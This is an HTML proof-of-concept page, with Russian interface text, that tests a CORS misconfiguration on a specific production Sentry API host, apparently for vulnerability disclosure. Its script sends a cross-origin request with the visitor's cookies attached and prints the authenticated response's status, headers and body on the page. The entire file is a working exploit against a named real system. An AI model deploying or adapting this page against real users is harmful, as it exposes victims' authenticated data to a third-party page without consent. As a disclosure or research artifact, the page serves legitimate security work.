<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>CORS Misconfiguration PoC</title>
</head>
<body>
  <h2>CORS Misconfiguration Test</h2>
  <button onclick="testCORS()">Отправить запрос</button>
  <pre id="output"></pre>

  <script>
    async function testCORS() {
      const output = document.getElementById('output');
      output.textContent = "Выполняю запрос...\n";

      try {
        const response = await fetch("https://sentry-prod.innogames.de/api/0/", {
          method: "GET",
          credentials: "include", // важно для использования кук
          headers: {
            "Content-Type": "application/json"
          }
        });

        let text;
        try {
          text = await response.text();
        } catch (e) {
          text = "[Не удалось прочитать тело ответа]";
        }

        output.textContent += "Статус: " + response.status + "\n\n";
        output.textContent += "Заголовки:\n";
        for (let [key, value] of response.headers.entries()) {
          output.textContent += key + ": " + value + "\n";
        }

        output.textContent += "\nТело ответа:\n" + text;
      } catch (err) {
        output.textContent += "Ошибка: " + err;
      }
    }
  </script>
</body>
</html>
